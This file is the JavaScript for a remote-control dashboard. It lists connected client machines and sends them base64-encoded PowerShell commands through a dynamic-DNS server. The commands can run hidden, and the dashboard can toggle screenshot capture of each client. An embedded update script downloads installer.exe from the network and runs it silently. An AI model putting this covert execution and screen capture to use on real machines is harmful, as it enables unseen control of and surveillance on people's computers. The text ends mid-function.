const RunApp = (() => {
    const VPS_URL = 'http://runx.ddns.net';

    const runState = {
        rows: [], sortedRows: [],
        password: sessionStorage.getItem('vps_password') || '',
        popupMode: null, popupUser: null,
        selectedVoice: 'David', selectedVis: true, activeUsername: null, interactionMode: null,
        lastRenderSignature: null, fetchInFlight: false, isConnected: false,
        hintUsername: null, isRendering: false, popupExampleText: '',
        cmdLoadedFromUpload: false, selectedSpkVolume: 100, selectedSpkSpeed: 0,
        themeSelection: localStorage.getItem('run_theme') || 'night',
        theme: 'night'
    };

    const popupExamples = {
        speak: ['Audio test, all systems ready.', 'Status update: task completed.', 'Heads up, check your dashboard.'],
        popup_msg: ['Reminder: save your work now.', 'Notice: update available.', 'Quick check: please confirm.']
    };
    const demoUsers = [
        { username: 'a-00000000-W', updated_at: new Date(Date.now() - 4000).toISOString(), visible: true, demo: true },
        { username: 'b-00000000-W', updated_at: new Date(Date.now() - 17000).toISOString(), visible: false, demo: true },
        { username: 'c-00000000-W', updated_at: new Date(Date.now() - 75000).toISOString(), visible: false, demo: true },
        { username: 'd-00000000-L', updated_at: new Date(Date.now() - 90000).toISOString(), visible: true, demo: true }
    ];

    const $ = id => document.getElementById(id);
    const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];

    // ── Theme helpers ──
    const cap = s => s.charAt(0).toUpperCase() + s.slice(1);
    function pickRandomTheme() { return themeNames[Math.floor(Math.random() * themeNames.length)]; }
    function updateRandomThemeOptionLabel(activeTheme) {
        const label = `Random (${cap(activeTheme)})`;
        ['run-theme-random-option', 'sidebar-theme-random-option'].forEach(id => {
            const el = $(id); if (el) el.textContent = label;
        });
    }
    function applyTheme(themeName = 'night') {
        const usingRandom = themeName === 'random';
        const next = usingRandom ? pickRandomTheme() : (themeNames.includes(themeName) ? themeName : 'night');
        runState.themeSelection = usingRandom ? 'random' : next;
        runState.theme = next;
        document.documentElement.dataset.theme = next;
        localStorage.setItem('run_theme', runState.themeSelection);
        updateRandomThemeOptionLabel(next);
        const lbl = $('run-theme-label');
        if (lbl) lbl.textContent = usingRandom ? `random (${next})` : next;
        FramesApp.sizeDropdownToContent(
            $('run-theme-btn'), $('runThemeMenu'), $('runThemeWrap'),
            Array.from($('runThemeMenu').querySelectorAll('.file-dropdown-item')).map(i => i.textContent.trim()),
            'file-btn'
        );
        document.querySelectorAll('#runThemeMenu .file-dropdown-item, .sidebar-theme-btn').forEach(el => {
            el.classList.toggle('active', el.dataset.themeVal === runState.themeSelection);
        });
    }

    // ── Connection ──
    function storePassword(password) {
        runState.password = password || '';
        if (runState.password) sessionStorage.setItem('vps_password', runState.password);
        else sessionStorage.removeItem('vps_password');
    }
    function setConnectionState(connected) {
        runState.isConnected = !!connected;
        const label = connected ? 'disconnect' : 'connect';
        ['run-connect-btn', 'sidebar-connect-btn'].forEach(id => {
            const el = $(id); if (!el) return;
            el.textContent = label;
            el.classList.toggle('connected', !!connected);
        });
    }
    function disconnectAndReset() {
        storePassword(''); setConnectionState(false);
        runState.rows = []; runState.sortedRows = []; runState.lastRenderSignature = null;
        renderGrid();
        if (typeof FramesApp?.resetFramesState === 'function') FramesApp.resetFramesState();
    }
    async function validateVpsConnection(password) {
        if (!password) return false;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 7000);
        try {
            const res = await fetch(`${VPS_URL}/api/clients`, {
                signal: controller.signal,
                headers: { 'x-password': password }
            });
            return res.ok;
        } catch { return false; } finally { clearTimeout(timeoutId); }
    }
    async function connectWithCredentials({ notifyOnFail = true } = {}) {
        const isValid = await validateVpsConnection(runState.password);
        if (!isValid) {
            storePassword(''); setConnectionState(false);
            if (notifyOnFail) alert('Connection failed. Please reconnect.');
            return false;
        }
        storePassword(runState.password); setConnectionState(true);
        fetchData(); return true;
    }
    async function promptAndConnect() {
        if (!promptAllCredentials()) return;
        await connectWithCredentials({ notifyOnFail: true });
    }
    function promptAllCredentials() {
        const passwordInput = prompt('Dashboard password:');
        if (passwordInput === null || !passwordInput) return false;
        runState.password = passwordInput;
        return true;
    }
    function parseServerTime(value) {
        if (!value) return NaN;
        const text = String(value).trim();
        if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(text)) {
            return new Date(text.replace(' ', 'T') + 'Z');
        }
        return new Date(text);
    }

    // ── Data helpers ──
    let dashboardSocket = null;
    function initDashboardSocket() {
        if (typeof io === 'undefined') return;
        if (!dashboardSocket) {
            try {
                dashboardSocket = io(VPS_URL);
                dashboardSocket.on('connect', () => {
                    if (runState.password) {
                        dashboardSocket.emit('register_dashboard', { password: runState.password });
                    }
                });
                dashboardSocket.on('status_change', (data) => {
                    if (!data || !data.username || !runState.isConnected) return;
                    const row = runState.rows.find(r => r.username === data.username);
                    if (row) {
                        row.online = !!data.online;
                        if (data.version !== undefined) row.version = data.version;
                        runState.sortedRows = sortRows(runState.rows);
                        renderGrid();
                    } else {
                        fetchData();
                    }
                });
                dashboardSocket.on('new_frame', (data) => {
                    if (typeof FramesApp !== 'undefined' && FramesApp.handleNewFrame) {
                        FramesApp.handleNewFrame(data);
                    }
                });
            } catch { }
        } else if (dashboardSocket.connected && runState.password) {
            dashboardSocket.emit('register_dashboard', { password: runState.password });
        }
    }

    function getStatus(user, nowMs = Date.now()) {
        if (user.demo && user.username === 'a-00000000-W') return 'green';
        if (user.demo) {
            const diff = (nowMs - parseServerTime(user.updated_at).getTime()) / 1000;
            return diff < 10 ? 'green' : diff < 30 ? 'yellow' : 'red';
        }
        if (typeof user.online === 'boolean') {
            return user.online ? 'green' : 'red';
        }
        const diff = (nowMs - parseServerTime(user.updated_at).getTime()) / 1000;
        return diff < 10 ? 'green' : diff < 30 ? 'yellow' : 'red';
    }
    const STATUS_ORDER = { green: 0, yellow: 1, red: 2 };
    function parseModernUsername(username) {
        const match = String(username || '').trim().match(/^(.*)-([^-]+)-(?:W|L)$/i);
        if (!match) return { baseName: String(username || '').trim(), id: '' };
        return { baseName: match[1], id: match[2] };
    }
    function buildDisplayUsernameMap(rows) {
        const counts = new Map();
        rows.forEach(user => {
            const { baseName } = parseModernUsername(user.username);
            counts.set(baseName, (counts.get(baseName) || 0) + 1);
        });
        return new Map(rows.map(user => {
            const parsed = parseModernUsername(user.username);
            const needsId = parsed.id && (counts.get(parsed.baseName) || 0) > 1;
            return [user.username, needsId ? `${parsed.baseName} (${parsed.id})` : parsed.baseName];
        }));
    }
    function sortRows(rows) {
        return [...rows].sort((a, b) =>
            STATUS_ORDER[getStatus(a)] - STATUS_ORDER[getStatus(b)] || a.username.localeCompare(b.username)
        );
    }
    function getRenderableRows() { return runState.isConnected ? runState.sortedRows : sortRows(demoUsers); }
    function getHintUsername(sorted = getRenderableRows()) {
        if (!sorted.length) return null;
        if (runState.activeUsername && sorted.some(u => u.username === runState.activeUsername)) return runState.activeUsername;
        return null;
    }
    function buildRowsRenderSignature(rows, isSorted = false) {
        const nowMs = Date.now();
        const source = isSorted ? rows : sortRows(rows);
        return source
            .map(u => {
                const st = getStatus(u, nowMs);
                return { username: u.username, status: st, visible: !!u.visible, updatedAt: st === 'green' ? '' : u.updated_at };
            })
            .sort((a, b) => STATUS_ORDER[a.status] - STATUS_ORDER[b.status] || a.username.localeCompare(b.username))
            .map(u => `${u.username}|${u.status}|${u.visible ? 1 : 0}|${u.updatedAt}`)
            .join('||');
    }

    // ── Rendering ──
    function refreshHintsIfNeeded() {
        if (runState.isRendering) return;
        const next = getHintUsername();
        if (next !== runState.hintUsername) { runState.hintUsername = next; renderGrid(); }
    }

    function getDisplayUsername(username) {
        return runState.displayNameMap?.get(username) || parseModernUsername(username).baseName;
    }

    const WIN_LOGO_HTML = `<i class="bi bi-windows os-logo" aria-hidden="true"></i>`;
    const LINUX_LOGO_HTML = `<i class="bi bi-ubuntu os-logo" aria-hidden="true"></i>`;
    const isWindowsUsername = username => /w$/i.test(String(username || '').trim());
    const isLinuxUsername = username => /l$/i.test(String(username || '').trim());

    function getCardBodyHtml(user, status, alive, tsText, showHint) {
        const canInteract = runState.isConnected || !!user.demo;
        const showPrimary = showHint && alive && canInteract;
        const disabledAttrs = 'disabled aria-disabled="true"';
        const displayUsername = getDisplayUsername(user.username);
        const showWin = isWindowsUsername(user.username);
        const showLinux = isLinuxUsername(user.username);
        const versionAttr = user.version ? ` title="${user.version}"` : '';
        return `
                <div class="card-header">
                    <div style="flex:1;min-width:0;">
                        <div style="display:flex;align-items:center;gap:8px;">
                            ${showWin ? WIN_LOGO_HTML : ''}${showLinux ? LINUX_LOGO_HTML : ''}
                            <span class="card-username ${alive ? '' : 'offline'}"${versionAttr}>${displayUsername}</span>
                        </div>
                        <div class="card-ts">${tsText}</div>
                    </div>
                </div>
                <div class="card-actions">
                    <button class="card-btn primary ${alive && canInteract ? '' : 'disabled'}" data-action="ps" ${alive && canInteract ? '' : disabledAttrs}>
                        CMD ${showPrimary ? '<span class="btn-hint">C</span>' : ''}
                    </button>
                    <button class="card-btn ${canInteract ? '' : 'disabled'}" data-action="output" ${canInteract ? '' : disabledAttrs}>
                        OUT ${showHint && canInteract ? '<span class="btn-hint">V</span>' : ''}
                    </button>
                </div>`;
    }
    function getCardRenderSignature(user, status, alive, tsText, showHint) {
        return `${user.username}|${getDisplayUsername(user.username)}|${user.version || ''}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
    }

    function renderGrid() {
        runState.isRendering = true;
        const grid = $('user-grid');
        const sorted = getRenderableRows();
        runState.displayNameMap = buildDisplayUsernameMap(sorted);
        runState.hintUsername = getHintUsername(sorted);

        if (!sorted.length) {
            if (!grid.querySelector('.empty')) grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
            runState.hintUsername = null; clearActiveSelection(); runState.isRendering = false; return;
        }

        const existingCards = new Map();
        grid.querySelectorAll('.user-card').forEach(card => existingCards.set(card.dataset.username, card));
        const animateAll = existingCards.size === 0;
        const seen = new Set();

        sorted.forEach((user, index) => {
            const status = getStatus(user);
            const alive = status === 'green';
            const lastSeen = parseServerTime(user.updated_at);
            const tsText = alive ? '' : `Last seen: ${lastSeen.toLocaleDateString()} ${lastSeen.toLocaleTimeString()}`;
            const showHint = user.username === runState.hintUsername;
            const sig = getCardRenderSignature(user, status, alive, tsText, showHint);
            let card = existingCards.get(user.username);
            const isNew = !card;
            if (!card) { card = document.createElement('div'); card.dataset.username = user.username; existingCards.set(user.username, card); }

            const cn = `user-card${alive ? '' : ' offline'}${isWindowsUsername(user.username) ? ' windows-user' : ''}`;
            if (card.className !== cn) card.className = cn;
            if (card.dataset.renderSignature !== sig) { card.innerHTML = getCardBodyHtml(user, status, alive, tsText, showHint); card.dataset.renderSignature = sig; }
            seen.add(user.username);

            const ref = grid.children[index] || null;
            if (ref !== card) grid.insertBefore(card, ref);

            if (isNew || animateAll) {
                card.classList.remove('card-enter');
                card.style.animationDelay = `${Math.min(index, 8) * 35}ms`;
                void card.offsetWidth;
                card.classList.add('card-enter');
            }
        });

        grid.querySelectorAll('.user-card').forEach(c => { if (!seen.has(c.dataset.username)) c.remove(); });
        grid.querySelector('.empty')?.remove();

        if (runState.activeUsername) {
            const active = sorted.find(u => u.username === runState.activeUsername);
            if (active) setActiveSelection(active, runState.interactionMode || 'hover');
            else clearActiveSelection();
        }
        if ($('actionTargetMenu')?.classList.contains('open')) renderTargetDropdown();
        runState.isRendering = false;
    }

    // ── Selection ──
    function setRunClientName(username) {
        const el = $('runClientName');
        const wrap = $('runClientWrap');
        if (!el || !wrap) return;
        if (username) {
            el.textContent = getDisplayUsername(username);
            wrap.style.display = 'flex';
        } else {
            el.textContent = '';
            wrap.style.display = 'none';
        }
    }

    function clearActiveSelection() {
        runState.activeUsername = null; runState.interactionMode = null;
        document.body.classList.remove('kb-mode');
        document.querySelectorAll('.user-card').forEach(c => c.classList.remove('selected'));
        setRunClientName(null);
        refreshHintsIfNeeded();
    }
    function setActiveSelection(user, mode, { scroll = false } = {}) {
        if (!user) { clearActiveSelection(); return; }
        runState.activeUsername = user.username; runState.interactionMode = mode;
        document.body.classList.toggle('kb-mode', mode === 'keyboard');
        const sorted = getRenderableRows();
        const idx = sorted.findIndex(u => u.username === user.username);
        const cards = document.querySelectorAll('.user-card');
        cards.forEach(c => c.classList.remove('selected'));
        if (idx !== -1 && idx < cards.length) {
            cards[idx].classList.add('selected');
            if (scroll) cards[idx].scrollIntoView({ block: 'nearest' });
        }
        refreshHintsIfNeeded();
    }

    // ── Popup helpers ──
    function pickRandomPopupExample(mode) {
        const list = popupExamples[mode];
        return list?.length ? list[Math.floor(Math.random() * list.length)] : '';
    }
    function updatePlaceholder() {
        const ta = $('popup-input'), m = runState.popupMode;
        if (m === 'cmd') ta.placeholder = "Get-Process | Where-Object { $_.CPU -gt 100 }";
        else if (m === 'speak') ta.placeholder = `Type speech text i.e. "${runState.popupExampleText || 'Audio test, all systems ready.'}"`;
        else if (m === 'popup_msg') ta.placeholder = `Type popup note i.e. "${runState.popupExampleText || 'Reminder: save your work now.'}"`;
    }
    function getPopupAutofillText() {
        const m = runState.popupMode;
        if (m === 'cmd') return $('popup-input').placeholder;
        return runState.popupExampleText || pickRandomPopupExample(m) || $('popup-input').placeholder;
    }
    function updateOptionsUI() {
        const setActive = (id, cond) => $(id).className = 'opt-btn' + (cond ? ' active' : '');
        setActive('voice-david', runState.selectedVoice === 'David');
        setActive('voice-zira', runState.selectedVoice === 'Zira');
        setActive('vis-true', runState.selectedVis);
        setActive('vis-false', !runState.selectedVis);

        const setPill = (id, cond) => $(id).className = 'collapsible-meta-pill' + (cond ? ' active' : '');
        setPill('shell-summary-ps', true);
        setPill('shell-summary-upload', runState.cmdLoadedFromUpload);

        const screenshotBtn = $('enable-screenshot-btn');
        const screenshotPill = $('screenshot-status-pill');
        if (screenshotBtn) {
            const isCapturing = !!runState.popupUser?.capture;
            screenshotBtn.classList.toggle('active', isCapturing);
            if (screenshotPill) screenshotPill.textContent = isCapturing ? 'ON' : 'OFF';
        }

        const vol = $('spk-volume'), spd = $('spk-speed');
        if (vol) vol.value = String(runState.selectedSpkVolume);
        if (spd) spd.value = String(runState.selectedSpkSpeed);
        const volV = $('spk-volume-value'), spdV = $('spk-speed-value'), meta = $('spk-summary-meta');
        if (volV) volV.textContent = String(runState.selectedSpkVolume);
        if (spdV) spdV.textContent = String(runState.selectedSpkSpeed);
        if (meta) meta.textContent = `Volume ${runState.selectedSpkVolume} | Speed ${runState.selectedSpkSpeed}`;
        updatePlaceholder();
    }

    // ── Popup open/close ──
    const ACTION_MODE_LABELS = {
        cmd: 'Commandline',
        speak: 'Speak',
        popup_msg: 'Message',
        scripts: 'Scripts',
        placeholder: 'Scripts'
    };
    function closeActionModeDropdown() {
        $('action-mode-btn')?.classList.remove('open');
        $('actionModeMenu')?.classList.remove('open');
    }
    function sizeActionModeDropdown() {
        if (typeof FramesApp !== 'undefined' && FramesApp.sizeDropdownToContent) {
            FramesApp.sizeDropdownToContent(
                $('action-mode-btn'), $('actionModeMenu'), $('actionModeWrap'),
                Array.from($('actionModeMenu').querySelectorAll('.file-dropdown-item')).map(i => i.textContent.trim()),
                'file-btn'
            );
        }
    }
    function applyActionMode(mode) {
        runState.popupMode = mode;
        runState.popupExampleText = (mode === 'speak' || mode === 'popup_msg') ? pickRandomPopupExample(mode) : '';
        runState.cmdLoadedFromUpload = false;
        $('popup-input').value = '';
        $('textarea-wrap').classList.remove('show-hint');
        const isCmd = mode === 'cmd', isSpk = mode === 'speak', isScripts = mode === 'scripts' || mode === 'placeholder';
        $('textarea-wrap').style.display = isScripts ? 'none' : 'flex';
        $('placeholder-body').style.display = isScripts ? 'flex' : 'none';
        $('vis-section').style.display = isCmd ? 'flex' : 'none';
        $('shell-section').style.display = isCmd ? 'block' : 'none';
        $('voice-section').style.display = isSpk ? 'flex' : 'none';
        $('spk-controls').style.display = isSpk ? 'block' : 'none';
        $('shell-section').open = false; $('spk-controls').open = false;
        $('popup-confirm').style.display = isScripts ? 'none' : '';
        const label = $('action-mode-label'); if (label) label.textContent = ACTION_MODE_LABELS[mode] || mode;
        document.querySelectorAll('#actionModeMenu .file-dropdown-item').forEach(item => {
            item.classList.toggle('active', item.dataset.mode === mode);
        });
        document.querySelectorAll('#sidebar-mode-list .sidebar-theme-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.mode === mode);
        });
        closeActionModeDropdown();
        updateOptionsUI();
        if (!isScripts) setTimeout(() => { $('popup-input').focus(); syncTabHint(); }, 50);
    }
    function closeTargetDropdown() {
        $('popup-target-label')?.classList.remove('open');
        $('actionTargetMenu')?.classList.remove('open');
    }
    function renderTargetDropdown() {
        const menu = $('actionTargetMenu');
        if (!menu) return;
        menu.innerHTML = '';
        const current = runState.popupUser;
        const allRows = getRenderableRows();

        if (typeof FramesApp !== 'undefined' && FramesApp.sizeDropdownToContent) {
            FramesApp.sizeDropdownToContent(
                $('popup-target-label'), menu, $('actionTargetWrap'),
                allRows.map(u => u.username), 'folder-btn run-client-name'
            );
        }

        const others = allRows.filter(u => u.username !== current?.username);
        if (!others.length) { closeTargetDropdown(); return; }
        others.forEach(u => {
            const item = document.createElement('div');
            item.className = 'dropdown-item';
            item.textContent = u.username;
            item.addEventListener('click', () => {
                closeTargetDropdown();
                openPopup(runState.popupMode || 'cmd', u);
            });
            menu.appendChild(item);
        });
    }
    function openPopup(mode, user) {
        runState.popupUser = user; runState.selectedVis = !!user.visible;
        $('popup-target-label').textContent = user.username;
        const sidebarTarget = $('sidebar-action-target');
        if (sidebarTarget) sidebarTarget.textContent = user.username;
        document.body.classList.remove('view-run', 'view-frames');
        document.body.classList.add('view-action');
        closeTargetDropdown();
        renderTargetDropdown();
        sizeActionModeDropdown();
        applyActionMode(mode);
    }
    function closePopup() {
        $('textarea-wrap').classList.remove('show-hint');
        closeTargetDropdown();
        closeActionModeDropdown();
        runState.popupMode = null; runState.popupUser = null; runState.popupExampleText = '';
        document.body.classList.remove('view-action');
        document.body.classList.add('view-run');
    }

    // ── Command building ──
    function formatPSString(str) {
        return str.replace(/'/g, "''").split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
    }

    const UPDATE_CLIENT_SCRIPT = `$p = "$env:APPDATA\\run"
if (!(Test-Path $p)) { 
    New-Item -ItemType Directory -Path $p 
}

$sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha
$o = "$p\\installer.exe"

Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
Start-Process $o`;

    async function doSendUpdateClient() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        const btn = $('update-client-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        isSendingCommand = true;
        const body = {
            username: user.username,
            cmd: btoa(unescape(encodeURIComponent(UPDATE_CLIENT_SCRIPT))),
            visible: 0
        };

        try {
            const res = await fetch(`${VPS_URL}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify(body)
            });
            if (!res.ok) throw new Error('Failed to send command');
            fetchData();
        } catch (e) {
            alert('Failed to send update command.');
        } finally {
            isSendingCommand = false;
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    async function doToggleEnableScreenshot() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        const nextCapture = !user.capture;
        const btn = $('enable-screenshot-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        try {
            const res = await fetch(`${VPS_URL}/api/capture`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: user.username, capture: nextCapture })
            });
            if (!res.ok) throw new Error('Failed to set capture');
            user.capture = nextCapture;
            const targetInRows = runState.rows.find(r => r.username === user.username);
            if (targetInRows) targetInRows.capture = nextCapture;
            updateOptionsUI();
            fetchData();
        } catch (e) {
            alert('Failed to toggle screenshot capture.');
        } finally {
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    async function doDeleteAllScreenshots() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        if (!confirm(`Are you sure you want to delete all screenshot frames for ${user.username}?`)) return;

        const btn = $('delete-screenshots-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        try {
            const res = await fetch(`${VPS_URL}/api/frames/delete`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: user.username })
            });
            if (!res.ok) throw new Error('Failed to delete frames');
            if (typeof FramesApp !== 'undefined' && FramesApp.state && FramesApp.state.currentFolder === user.username) {
                if (typeof FramesApp.resetFramesState === 'function') FramesApp.resetFramesState();
            }
            alert(`Successfully deleted all screenshot frames for ${user.username}.`);
        } catch (e) {
            alert('Failed to delete screenshots.');
        } finally {
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    // ── Send / fetch ──
    let isSendingCommand = false;
    async function doSendPopup() {
        if (isSendingCommand) return;
        const user = runState.popupUser, mode = runState.popupMode;
        const val = $('popup-input').value.trim();
        if (!user) return;
        if (!runState.isConnected || user.demo) { closePopup(); alert('Demo mode: action preview only. Connect to send real commands.'); return; }

        let rawCmd = '';
        if (mode === 'cmd') {
            rawCmd = val;
        } else if (val) {
            const msg = formatPSString(val);
            if (mode === 'speak') {
                rawCmd = `$s=New-Object -Com SAPI.SpVoice;$s.Volume=${runState.selectedSpkVolume};$s.Rate=${runState.selectedSpkSpeed};$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${runState.selectedVoice}*'};$s.Speak(${msg})`;
            } else {
                rawCmd = `(New-Object -Com WScript.Shell).Popup(${msg})`;
            }
        }

        if (!rawCmd && mode !== 'cmd') { closePopup(); return; }
        isSendingCommand = true;
        const body = {
            username: user.username,
            cmd: rawCmd ? btoa(rawCmd) : '',
            visible: mode === 'cmd' ? (runState.selectedVis ? 1 : 0) : 0
        };

        try {
            const res = await fetch(`${VPS_URL}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify(body)
            });
            if (!res.ok) return;
            closePopup(); fetchData();
        } catch { } finally {
            isSendingCommand = false;
        }
    }

    async function doViewOutput(user) {
        if (user?.demo || !runState.isConnected) {
            const out = `[demo] ${user.username}\nstatus: preview only\nlast action: none (connect to enable live output)`;
            navigator.clipboard.writeText(out).catch(() => { });
            alert(out); return;
        }
        alert(`[${getDisplayUsername(user.username)}]\nCommand output capture is not yet available.`);
    }

    async function fetchData() {
        if (!runState.isConnected || runState.fetchInFlight) return;
        initDashboardSocket();
        runState.fetchInFlight = true;
        try {
            const res = await fetch(`${VPS_URL}/api/clients`, {
                headers: { 'x-password': runState.password }
            });
            const nextRows = await res.json();
            const nextSorted = sortRows(nextRows);
            const sig = buildRowsRenderSignature(nextSorted, true);
            runState.rows = nextRows; runState.sortedRows = nextSorted;
            if (sig === runState.lastRenderSignature) return;
            runState.lastRenderSignature = sig;
            renderGrid();
        } catch { } finally { runState.fetchInFlight = false; }
    }

    // ── Visibility ──
    async function setPopupVisibility(nextVisible) {
        if (runState.popupMode !== 'cmd' || !runState.popupUser) return;
        runState.selectedVis = !!nextVisible;
        runState.popupUser.visible = runState.selectedVis;
        const idx = runState.rows.findIndex(r => r.username === runState.popupUser.username);
        if (idx !== -1) runState.rows[idx] = { ...runState.rows[idx], visible: runState.selectedVis };
        updateOptionsUI(); renderGrid();
        if (!runState.isConnected || runState.popupUser.demo) return;
        try {
            await fetch(`${VPS_URL}/api/visibility`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: runState.popupUser.username, visible: runState.selectedVis ? 1 : 0 })
            });
        } catch { }
    }

    // ── Tab / autofill ──
    function syncTabHint() {
        const ta = $('popup-input'), wrap = $('textarea-wrap');
        const focused = document.activeElement === ta;
        wrap.classList.toggle('show-hint', focused);
        $('tab-autofill-hint').style.display = (focused && ta.value === '') ? 'flex' : 'none';
        $('tab-unfocus-hint').style.display = focused ? 'flex' : 'none';
    }
    function autofillPopupInput() {
        const ta = $('popup-input'); if (ta.value !== '') return;
        ta.value = getPopupAutofillText(); runState.cmdLoadedFromUpload = false;
        ta.selectionStart = ta.selectionEnd = ta.value.length;
        updateOptionsUI(); syncTabHint();
    }
    function unfocusPopupInput() { $('popup-input').blur(); syncTabHint(); }

    // ── Init ──
    function init() {
        applyTheme(runState.themeSelection);
        setConnectionState(false);
        sizeActionModeDropdown();

        // Theme dropdown
        const themeBtn = $('run-theme-btn'), themeMenu = $('runThemeMenu');
        if (themeBtn && themeMenu) {
            themeBtn.addEventListener('click', () => { themeBtn.classList.toggle('open'); themeMenu.classList.toggle('open'); });
            themeMenu.querySelectorAll('.file-dropdown-item').forEach(item => {
                item.addEventListener('click', () => {
                    applyTheme(item.dataset.themeVal);
                    themeBtn.classList.remove('open'); themeMenu.classList.remove('open');
                });
            });
            document.addEventListener('click', e => {
                if (!$('runThemeWrap').contains(e.target)) {
                    themeBtn.classList.remove('open'); themeMenu.classList.remove('open');
                }
            });
        }

        // Connect / disconnect
        const handleConnect = () => {
            if (runState.isConnected) { if (!confirm('Disconnect now?')) return; disconnectAndReset(); return; }
            promptAndConnect();
        };
        ['run-connect-btn', 'sidebar-connect-btn'].forEach(id => $(id)?.addEventListener('click', handleConnect));

        // Sidebar theme buttons
        document.querySelectorAll('.sidebar-theme-btn').forEach(btn => {
            if (btn.dataset.themeVal) btn.addEventListener('click', () => applyTheme(btn.dataset.themeVal));
        });

        // Sidebar action mode buttons
        document.querySelectorAll('#sidebar-mode-list .sidebar-theme-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                if (!runState.popupUser) return;
                applyActionMode(btn.dataset.mode);
                closeSidebar();
            });
        });

        // Sidebar download
        $('sidebar-download-btn')?.addEventListener('click', async () => {
            if (FramesApp.downloadCurrentFrame) await FramesApp.downloadCurrentFrame();
            closeSidebar();
        });

        // Sidebar open/close
        const sidebar = $('sidebar'), overlay = $('sidebarOverlay');
        function openSidebar() {
            if (window.__getCurrentMode?.() === 'frames' && window.__framesMenuDisabled) return;
            sidebar.classList.add('open'); overlay.classList.add('open');
        }
        function closeSidebar() { sidebar.classList.remove('open'); overlay.classList.remove('open'); }
        $('hamburgerBtn')?.addEventListener('click', openSidebar);
        overlay?.addEventListener('click', closeSidebar);
        $('sidebarClose')?.addEventListener('click', closeSidebar);

        setInterval(fetchData, 4000);

        // Grid interactions
        const grid = $('user-grid');
        grid.addEventListener('mousemove', e => {
            const card = e.target.closest('.user-card');
            if (!card) { if (runState.interactionMode === 'hover') clearActiveSelection(); return; }
            const username = card.dataset.username;
            if (!username || username === runState.activeUsername) return;
            const user = getRenderableRows().find(u => u.username === username);
            if (user) setActiveSelection(user, 'hover');
        });
        grid.addEventListener('mouseleave', () => { if (runState.interactionMode === 'hover') clearActiveSelection(); });
        grid.addEventListener('click', e => {
            const btn = e.target.closest('.card-btn'); if (!btn) return;
            const card = e.target.closest('.user-card'); if (!card) return;
            const username = card.dataset.username; if (!username) return;
            const user = getRenderableRows().find(u => u.username === username); if (!user) return;
            const action = btn.dataset.action; if (!action) return;
            if (action === 'ps') openPopup('cmd', user);
            if (action === 'output') doViewOutput(user);
        });

        // Target dropdown inside the action page breadcrumb
        $('popup-target-label').addEventListener('click', e => {
            e.stopPropagation();
            if (!runState.popupUser) return;
            renderTargetDropdown();
            $('popup-target-label').classList.toggle('open');
            $('actionTargetMenu').classList.toggle('open');
        });
        document.addEventListener('click', e => {
            if (!$('actionTargetWrap')?.contains(e.target)) closeTargetDropdown();
        });

        // Action mode dropdown (header)
        $('action-mode-btn')?.addEventListener('click', e => {
            e.stopPropagation();
            if (!runState.popupUser) return;
            $('action-mode-btn').classList.toggle('open');
            $('actionModeMenu').classList.toggle('open');
        });
        document.querySelectorAll('#actionModeMenu .file-dropdown-item').forEach(item => {
            item.addEventListener('click', () => {
                if (!runState.popupUser) return;
                applyActionMode(item.dataset.mode);
            });
        });
        document.addEventListener('click', e => {
            if (!$('actionModeWrap')?.contains(e.target)) closeActionModeDropdown();
        });

        // Option button listeners
        $('voice-david').onclick = () => { runState.selectedVoice = 'David'; updateOptionsUI(); };
        $('voice-zira').onclick = () => { runState.selectedVoice = 'Zira'; updateOptionsUI(); };
        $('spk-volume').oninput = e => { runState.selectedSpkVolume = Number(e.target.value); updateOptionsUI(); };
        $('spk-speed').oninput = e => { runState.selectedSpkSpeed = Number(e.target.value); updateOptionsUI(); };
        $('vis-true').onclick = () => setPopupVisibility(true);
        $('vis-false').onclick = () => setPopupVisibility(false);
        $('upload-btn').onclick = () => $('file-upload').click();
        $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
        $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
        $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);

        $('file-upload').onchange = e => {
            const file = e.target.files[0]; if (!file) return;
            const reader = new FileReader();
            reader.onload = ev => {
                $('popup-input').value = ev.target.result;
                runState.cmdLoadedFromUpload = true;
                $('popup-input').focus(); updateOptionsUI();
            };
